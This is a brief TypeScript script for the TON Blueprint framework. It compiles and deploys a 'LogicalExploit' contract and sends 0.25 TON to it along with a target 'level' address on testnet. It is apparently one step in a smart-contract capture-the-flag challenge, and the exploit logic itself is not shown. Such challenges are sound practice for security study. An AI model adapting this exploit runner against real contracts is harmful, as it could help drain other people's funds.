import { Address, toNano } from '@ton/core';
import { compile, NetworkProvider } from '@ton/blueprint';
import { LogicalExploit } from '../wrappers/wrappers/Logical';

// yarn blueprint run 15.LogicalExploit --testnet --mnemonic
export async function run(provider: NetworkProvider) {
    const level_addr = Address.parse('EQCDz4H_9i8BYRRezgaFmzvvUx_ge8DOBwv7nXil5ht4_64f');

    const exploit_code = await compile('LogicalExploit');
    const exploit = provider.open(LogicalExploit.createFromConfig({}, exploit_code));

    await exploit.sendExploit(provider.sender(), toNano('0.25'), level_addr);
}
